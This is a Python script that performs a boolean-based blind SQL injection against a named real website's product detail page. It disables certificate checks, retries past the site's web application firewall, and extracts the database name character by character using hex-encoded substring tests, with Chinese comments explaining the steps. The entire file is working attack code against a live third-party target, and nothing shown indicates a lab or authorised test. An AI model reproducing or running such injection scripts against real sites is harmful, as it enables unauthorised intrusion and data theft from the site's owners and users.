#!/usr/bin/env python3
import urllib.request, urllib.parse, ssl, time
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
BASE = 'http://www.yijingweb.com/webmall/detail.php?id='
TRUE_MARK = '产品展示模块'

def q(payload):
    url = BASE + urllib.parse.quote(payload, safe='')
    for retry in range(3):
        try:
            r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=12, context=ctx)
            b = r.read(80000).decode('utf-8','ignore')
        except urllib.error.HTTPError as e:
            b = e.read(80000).decode('utf-8','ignore')
        except Exception:
            time.sleep(2); continue
        if 'WTS-WAF' in b:
            time.sleep(3); continue
        if 'Invalid SQL' in b:
            return None
        return TRUE_MARK in b
    return None

def test(cond):
    r = q("687' and if(%s,687,0)#" % cond)
    time.sleep(0.3)
    return r

# 数据库名长度9, 逐字符提取(用hex避免中文ascii问题)
# 用 hex(substr(...)) 转16进制, 再逐位猜
def get_hex_char(pos):
    """提取第pos字符的hex(2字节), 用等值猜hex的每一位"""
    hexchars = '0123456789abcdef'
    hexval = ''
    # 每字符hex长度未知, 先测长度
    for i in range(1, 9):  # 最多8个hex位(4字节)
        found = False
        for hc in hexchars:
            r = test("ascii(substr(hex(substr(database(),%d,1)),%d,1))=%d" % (pos, i, ord(hc)))
            if r is True:
                hexval += hc
                found = True
                break
        if not found:
            break
    return hexval

print('=== 提取database()逐字符(hex) ===')
result_hex = ''
for pos in range(1, 10):  # 长度9
    hx = get_hex_char(pos)
    result_hex += hx
    print('  位置%d hex=%s' % (pos, hx), flush=True)

print('完整hex: %s' % result_hex)
# hex转字符串
try:
    s = bytes.fromhex(result_hex).decode('utf-8', 'replace')
    print('database() = %s' % s)
except:
    print('解码失败')
